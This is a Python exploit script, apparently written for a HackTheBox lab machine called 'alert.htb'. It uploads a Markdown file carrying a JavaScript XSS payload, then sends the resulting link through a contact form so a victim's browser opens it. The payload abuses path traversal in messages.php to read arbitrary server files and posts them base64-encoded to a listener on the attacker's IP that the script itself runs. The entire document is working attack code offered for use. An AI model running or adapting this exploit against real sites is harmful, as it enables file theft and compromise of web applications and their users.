#!/usr/bin/env python3

import re
import time
import base64
import argparse
import requests
import threading
from io import BytesIO
from http.server import BaseHTTPRequestHandler, HTTPServer


class SimpleHttpRequestHandler(BaseHTTPRequestHandler):
    def log_request(self, code='-', size='-'):
        pass

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        b64_data = self.rfile.read(content_length)
        data = "\n" + base64.b64decode(b64_data).decode()[5:-7]
        print(data)
        self.send_response(200)
        self.end_headers()


def start_server(ip, port):
    server = HTTPServer((ip, port), SimpleHttpRequestHandler)
    print(f"[+] HTTP server started on port {port}")
    server.serve_forever()


def run_server_in_thread(ip, port):
    server_thread = threading.Thread(target=start_server, args=(ip, port))
    server_thread.daemon = True
    server_thread.start()

    return server_thread


def upload_file(target, ip, file, proxy):
    upload_url = f"{target}" + "/visualizer.php"
    payload = f"""
    <script>
    var req1 = new XMLHttpRequest();
    req1.open("get", "{target}/messages.php?file=../../../..{file}", false);
    req1.onload = () => {{
        if (req1.readyState === req1.DONE) {{
            if (req1.status === 200) {{
                var resp = req1.response;
                var req2 = new XMLHttpRequest();
                var url = "http://{ip}:{port}/exfil";
                req2.open("post", url);
                req2.send(btoa(resp)); }}
            }}
        }}
    req1.send();
    </script>
    """.strip()

    files = {"file": ("malicious.md", BytesIO(bytes(payload, "utf-8")), "application/octet-stream")}
    response = requests.post(upload_url, files=files, proxies=proxy)
    pattern = r'href="([^"]*/visualizer\.php[^"]*)"'
    match = re.search(pattern, response.text)
    xss_url = match.group(1)

    return xss_url


def execute_xss(target, xss_url):
    url = f"{target}/contact.php"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"email": "ma@licio.us", "message": xss_url}
    _ = requests.post(url, headers=headers, data=data)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Target host (ie. http://alert.htb)")
    parser.add_argument("-i", "--ip", help="Attacker's IP to listen on (ie. 10.10.x.x)")
    parser.add_argument("-p", "--port", help="Port to listen on")
    parser.add_argument("-x", "--proxy", help="Proxy the requests (ie. 10.10.x.x:8080)", required=False)
    args = parser.parse_args()

    try:
        target = args.target
        ip = args.ip
        port = int(args.port)
        if args.proxy and "/" in args.proxy:
            parser.error("Unexpected arguments supplied.")
        elif not args.proxy:
            proxy = {}
        else:
            proxy_ip = args.proxy.split(":")[0]
            proxy_port = args.proxy.split(":")[1]
            proxy = {"http": f"http://{proxy_ip}:{proxy_port}"}
    except Exception:
        parser.print_usage()
        exit()

    server_thread = run_server_in_thread(ip, port)
    try:
        time.sleep(1)
        print("[!] Type 'exit' to terminate.")
        while True:
            time.sleep(0.5)
            file = input("\nfile> ")
            if file == "exit":
                print("[+] Exiting...")
                break
            if file == "":
                continue
            xss_url = upload_file(target, ip, file, proxy)
            execute_xss(target, xss_url)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Shutting down the server...")
        exit()
